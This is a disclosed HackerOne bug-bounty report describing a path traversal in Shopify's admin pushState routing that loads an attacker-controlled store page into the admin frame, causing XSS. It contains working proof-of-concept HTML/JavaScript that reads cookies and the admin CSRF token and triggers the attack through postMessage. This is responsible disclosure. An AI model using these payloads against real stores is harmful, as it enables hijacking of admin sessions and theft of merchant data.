# Inject page in admin panel via Shopify.API.pushState

## Report Details
- **Report ID**: 662083
- **URL**: https://hackerone.com/reports/662083
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-07-27T23:17:32.559Z
- **Disclosed**: 2019-09-09T16:40:43.129Z

## Reporter
- **Username**: tiago-danin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
# Summary
`Shopify.API.pushState` call the method `handleRoutePushEvent`, allows you to change routes to open pages from admin panel:
```js
handleRoutePushEvent({pathname: e, search: t, state: a, hash: o}) {
                const {adminPath: n, history: i} = this.props // `adminPath` = `/admin`
                  , s = "".concat(n).concat(e);
                // *** //
}
```
If we use the prefix `..` in `pathname` It will removes `admin` (`/admin/../pages/xss` ~> `/pages/xss`). You can load pages from outside the admin panel. The `document.getElementById("AppFrameMain")` will be modified with an insecure page.

## Step to Reproduce
1. Create an page with the XSS (title: xss, path: /pages/xss):
{F540958}
```html
<script>
alert("XSS By Tiago")
console.log("Document:", document)
console.log("Window:", window)
console.log("Cookies:", document.cookie)
console.log("Location:", window.location)
console.log("CSRF Token:", document.querySelectorAll('[data-serialized-id="csrf"]')[0].innerText)
</script>
```

2. Create another page with our triggered XSS (title: xss play, path: /pages/xss-play):
{F540963}
```html
<script>
    function attack(){
        const ctx = window.open(location.origin+'/admin/themes', '_blank')
        const data = JSON.stringify({
            message: 'Shopify.API.pushState',
            data: {pathname: "/../pages/xss"}
        });

        let interval;
        interval = setInterval(function(){
            if (window.attackSuccess) {
                clearInterval(interval)
            } else {
                ctx.postMessage(data)
            }
        }, 500)
    }
    attack()
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

3. Open the page https://[YOU_STORE].myshopify.com/pages/xss-play
4. Admin panel has been opened and script executed:
{F540964}

Tested with Google Chrome - Version 76.0.3788.1 (Official Build) dev (64-bit)

## Impact

Abuse the active admin session to extract data as:
- CSRF token.
- Store config.

## Attachments
- DeepinScreenshot_google-chrome-unstable_20190727194202.png
- DeepinScreenshot_google-chrome-unstable_20190727194507.png
- DeepinScreenshot_google-chrome-unstable_20190727195220.png
